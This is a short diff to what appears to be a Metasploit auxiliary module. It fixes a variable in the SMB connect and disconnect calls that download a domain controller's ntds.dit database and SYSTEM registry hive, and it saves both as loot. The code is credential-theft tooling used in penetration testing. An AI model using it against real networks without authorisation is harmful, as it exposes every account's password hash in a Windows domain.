@@ -196,7 +196,7 @@ class Metasploit3 < Msf::Auxiliary
 		print_status("Downloading ntds.dit file")
 		begin
 			# Try to download ntds.dit
-			simple.connect("\\\\#{ip}\\#{@smbshare}")
+			simple.connect("\\\\#{@ip}\\#{@smbshare}")
 			remotefile = simple.open("#{file}", 'rob')
 			data = remotefile.read
 			store_loot("NTDS.database", "data", ip, data, "ntds.dit", nil, nil)
@@ -205,7 +205,7 @@ class Metasploit3 < Msf::Auxiliary
 			print_error("Unable to downlaod ntds.dit: #{ntdsdownloaderror}")
 			return ntdsdownloaderror
 		end
-		simple.disconnect("\\\\#{ip}\\#{@smbshare}")
+		simple.disconnect("\\\\#{@ip}\\#{@smbshare}")
 	end
 
 
@@ -214,7 +214,7 @@ class Metasploit3 < Msf::Auxiliary
 		print_status("Downloading SYSTEM hive file")
 		begin
 			# Try to download SYSTEM hive
-			simple.connect("\\\\#{ip}\\#{@smbshare}")
+			simple.connect("\\\\#{@ip}\\#{@smbshare}")
 			remotefile = simple.open("#{file}", 'rob')
 			data = remotefile.read
 			store_loot("Registry.hive.system", "binary/reg", ip, data, "system-hive", nil, nil)
@@ -223,6 +223,7 @@ class Metasploit3 < Msf::Auxiliary
 			print_error("Unable to download SYSTEM hive: #{sysdownloaderror}")
 			return sysdownloaderror
 		end
+		simple.disconnect("\\\\#{@ip}\\#{@smbshare}")
 	end
 
 
